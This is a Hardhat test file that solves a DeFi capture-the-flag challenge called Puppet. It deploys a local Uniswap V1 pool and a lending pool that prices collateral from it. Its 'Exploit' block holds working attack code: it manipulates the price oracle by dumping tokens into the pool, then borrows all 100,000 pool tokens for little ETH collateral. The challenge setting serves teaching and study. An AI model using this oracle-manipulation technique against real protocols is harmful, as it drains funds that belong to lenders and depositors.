const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { BigNumber } = require("ethers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        //swap DVT's for eth, because we are adding DVTs to the pool
        //the price of the DVT will fall
        const outputPrice =  await this.uniswapExchange.getTokenToEthInputPrice(
                    ethers.utils.parseEther('9'),
                    { gasLimit: 1e6 }
                )

        console.log(' outputPrice:' , ethers.utils.formatEther(outputPrice) );

        //We need to approve the exchange to use our tokens
        await this.token
        .connect(attacker)
        .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapExchange
        .connect(attacker)
        .tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            1,
            (await ethers.provider.getBlock('latest')).timestamp * 2,
            { gasLimit: 1e6 }
        )

         this.tokenBalance = await this.token.balanceOf(attacker.address);
         this.ethBalance = await ethers.provider.getBalance(attacker.address)

         console.log('====== After swapping all my DVTs ======'  );
         console.log(' tokenBalance:' , ethers.utils.formatEther(this.tokenBalance) );
         console.log(' ethBalance:' , ethers.utils.formatEther(this.ethBalance));

        //Then we proceed to borrow as much as we can with our 25eth
       // await this.
     
       const value = BigNumber.from( this.ethBalance)
       .sub(ethers.utils.parseEther('0.1'));

        //swap DVT's for eth, because we are adding DVTs to the pool
        //the price of the DVT will fall
        const outputPriceAfter =  await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('9'),
            { gasLimit: 1e6 }
        )

        console.log(' outputPriceAfter:' , ethers.utils.formatEther(outputPriceAfter) );
        
        //Will borrow at a cheaper price
        await this.lendingPool
        .connect(attacker)
        .borrow(
            POOL_INITIAL_TOKEN_BALANCE, 
            {value: value}
            )

        //We swap back the eth for our initial balance
        await this.uniswapExchange
        .connect(attacker)
        .ethToTokenSwapInput(
            1,
            (await ethers.provider.getBlock('latest')).timestamp * 2,
            { value: UNISWAP_INITIAL_ETH_RESERVE,
             gasLimit: 1e6 }
        )
        
        this.tokenBalance = await this.token.balanceOf(attacker.address);
        this.ethBalance = await ethers.provider.getBalance(attacker.address)

        console.log(' tokenBalance:' , ethers.utils.formatEther(this.tokenBalance) );
        console.log(' ethBalance:' , ethers.utils.formatEther(this.ethBalance));

        //swap DVT's for eth, because we are adding DVTs to the pool
        //the price of the DVT will fall
        const finalOutputPrice =  await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('9'),
            { gasLimit: 1e6 }
        )
        
        //Gain for the attacker is even greater since 
        //he has raise the price of the token in the pool
        console.log('finalOutputPrice:' , ethers.utils.formatEther(finalOutputPrice) );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});